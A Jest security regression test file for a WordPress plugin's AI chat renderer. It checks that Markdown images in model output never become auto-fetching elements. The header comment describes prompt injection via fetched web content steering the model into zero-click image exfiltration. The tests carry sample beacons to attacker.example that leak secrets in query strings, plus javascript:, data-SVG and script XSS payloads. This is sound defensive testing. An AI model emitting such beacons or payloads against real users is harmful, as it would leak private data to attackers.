// @ts-check
/**
 * Security regression tests for Markdown rendering in assets/admin.js.
 *
 * An <img> fetches with no user interaction, so a src in model output is a
 * zero-click exfiltration channel: fetch_url pulls untrusted web content into
 * the model's context, and a prompt injection there controls the markdown the
 * chat renders. Markdown images are therefore never rendered as images.
 *
 * Unlike the other suites here, this one does NOT copy the functions verbatim.
 * A copy would keep passing if `image:` were dropped from the marked.use() call
 * in admin.js, which is precisely the regression worth catching. Instead the
 * real renderer block is extracted from the shipped file, applied to the bundled
 * marked build, and exercised through marked.parse() — so the assertions cover
 * the wiring, not just the functions.
 */

'use strict';

const fs   = require('fs');
const path = require('path');

const ASSETS = path.join(__dirname, '..', '..', '..', 'assets');

/**
 * Instantiate an independent copy of the exact marked build that ships to the
 * browser (not the devDependency). Independent copies matter because marked.use()
 * mutates the instance: one copy gets admin.js's renderers, one stays pristine
 * as a control.
 */
function freshMarked() {
    const src = fs.readFileSync(path.join(ASSETS, 'marked.min.js'), 'utf8');
    const mod = { exports: {} };
    new Function('module', 'exports', src)(mod, mod.exports);
    return mod.exports;
}

// Copied from admin.js only because the renderer block closes over it; it is
// not what these tests assert on.
function esc(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

/**
 * Pull the renderer definitions plus the marked.use() call out of admin.js.
 * Throws rather than silently testing nothing if the file is restructured.
 */
function loadRendererBlock() {
    const src   = fs.readFileSync(path.join(ASSETS, 'admin.js'), 'utf8');
    const start = src.indexOf('    // Render a markdown link:');
    const end   = src.indexOf('    function renderAssistantMarkdown(text) {');

    if (start < 0 || end <= start) {
        throw new Error(
            'Could not locate the markdown renderer block in assets/admin.js. '
            + 'If it was renamed or moved, update the anchors in this test.'
        );
    }

    const block = src.slice(start, end);
    if (!block.includes('marked.use(')) {
        throw new Error('Extracted block does not configure marked; anchors are stale.');
    }
    return block;
}

// Stand-in for the browser globals the renderer block may consult, passed in as
// a scope parameter rather than assigned globally. Supplying a working `window`
// matters: without one, any origin check would throw and fall back to blocking,
// so the suite would rate a permissive same-origin allowlist as safe when in a
// browser it would happily emit an <img>.
const fakeWindow = {
    location: {
        href:   'http://localhost/wp-admin/tools.php?page=haydi',
        origin: 'http://localhost',
    },
};

// Apply the real marked.use() configuration from admin.js to a real marked instance.
const marked = freshMarked();
new Function('marked', 'esc', 'window', loadRendererBlock())(marked, esc, fakeWindow);

const render = (md) => marked.parse(md);

/** Every element that fetches its source automatically, with no user action. */
const AUTO_FETCHING = /<(img|source|iframe|video|audio|object|embed|track|link)\b/i;

// ---------------------------------------------------------------------------
// Guard: prove the suite has teeth before trusting any assertion below
// ---------------------------------------------------------------------------

test('control: unconfigured marked DOES emit an <img>, so the suite is meaningful', () => {
    expect(freshMarked().parse('![](https://attacker.example/x.png)')).toMatch(AUTO_FETCHING);
});

// ---------------------------------------------------------------------------
// No markdown image, anywhere, becomes an auto-fetching element
// ---------------------------------------------------------------------------

test.each([
    ['direct exfil beacon',   '![](https://attacker.example/log?k=SECRET_DB_ROW)'],
    ['alt text supplied',     '![loading](https://attacker.example/log?k=SECRET)'],
    ['plain http',            '![](http://attacker.example/log?k=SECRET)'],
    ['protocol-relative',     '![](//attacker.example/log?k=SECRET)'],
    ['reference style',       '![a][r]\n\n[r]: https://attacker.example/x.png'],
    ['nested inside a link',  '[![](https://attacker.example/x.png)](https://ok.example)'],
    ['inside a table cell',   '| a |\n|---|\n| ![](https://attacker.example/x.png) |'],
    ['inside a blockquote',   '> ![](https://attacker.example/x.png)'],
    ['inside a list item',    '- ![](https://attacker.example/x.png)'],
    ['inside a heading',      '# ![](https://attacker.example/x.png)'],
    ['root-relative',         '![](/wp-content/uploads/photo.png)'],
    ['bare relative',         '![](photo.png)'],
    ['same-origin absolute',  '![](http://localhost/wp-admin/admin-ajax.php?action=x)'],
    ['open-redirect shaped',  '![](/?redirect_to=https://attacker.example/log?k=SECRET)'],
    ['javascript scheme',     '![](javascript:alert(1))'],
    ['data scheme',           '![](data:image/svg+xml,<svg onload="alert(1)"/>)'],
    ['empty source',          '![alt]()'],
    ['title attribute',       '![a](https://attacker.example/x "a title")'],
])('%s renders no auto-fetching element', (_label, md) => {
    expect(render(md)).not.toMatch(AUTO_FETCHING);
});

test('raw <img> HTML in model output stays escaped', () => {
    const html = render('<img src="https://attacker.example/x.png">');
    expect(html).not.toMatch(AUTO_FETCHING);
    expect(html).toContain('&lt;img');
});

// ---------------------------------------------------------------------------
// The blocked placeholder names its destination and cannot be disguised
// ---------------------------------------------------------------------------

test('placeholder shows the destination even with no alt text', () => {
    const html = render('![](https://attacker.example/log?k=SECRET)');
    expect(html).toContain('wpc-blocked-image');
    expect(html).toContain('attacker.example');
});

test('attacker-controlled alt text cannot disguise the destination', () => {
    const html = render('![https://trusted.example/logo.png](https://attacker.example/log?k=SECRET)');
    expect(html).toContain('attacker.example');
    expect(html).not.toContain('trusted.example');
});

test('an over-long URL is elided but still leads with its host', () => {
    const html = render('![](https://attacker.example/log?k=' + 'A'.repeat(5000) + ')');
    expect(html).toContain('attacker.example');
    expect(html).toContain('…');
    expect(html.length).toBeLessThan(600);
});

test('placeholder text is escaped', () => {
    const html = render('![](https://attacker.example/x)\n\n![](<https://a.example/"><script>alert(1)</script>>)');
    expect(html).not.toContain('<script>');
});

// ---------------------------------------------------------------------------
// Link rendering is unchanged — images are the only behaviour being removed
// ---------------------------------------------------------------------------

test('http(s) links still render, opening in a new tab with noopener', () => {
    const html = render('[docs](https://example.com/docs)');
    expect(html).toContain('href="https://example.com/docs"');
    expect(html).toContain('rel="noopener noreferrer"');
});

test('wpc-view links still become file-viewer buttons', () => {
    const html = render('[style.css](wpc-view:/var/www/style.css)');
    expect(html).toContain('class="wpc-view-toggle"');
    expect(html).toContain('data-path="/var/www/style.css"');
});

test('javascript: links still degrade to plain text', () => {
    const html = render('[click](javascript:alert(1))');
    expect(html).not.toContain('<a ');
    expect(html).not.toContain('javascript:');
});
